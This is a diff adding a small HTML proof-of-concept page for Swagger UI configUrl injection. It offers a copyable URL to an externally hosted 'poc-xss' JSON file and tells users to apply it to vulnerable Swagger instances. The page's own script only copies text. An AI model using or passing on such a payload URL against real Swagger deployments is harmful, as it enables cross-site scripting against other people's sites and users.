@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Swagger configUrl PoC</title>
+</head>
+<body>
+    <h1>Swagger UI configUrl Injection PoC</h1>
+    <p>Use this configUrl in vulnerable Swagger instances:</p>
+    <input type="text" id="configUrl" value="https://paktamxbotz.github.io/poc-xss/hck.json" size="80">
+    <button onclick="copyUrl()">Copy</button>
+    
+    <script>
+        function copyUrl() {
+            const el = document.getElementById("configUrl");
+            el.select();
+            document.execCommand("copy");
+            alert("Copied to clipboard!");
+        }
+    </script>
+</body>
+</html>
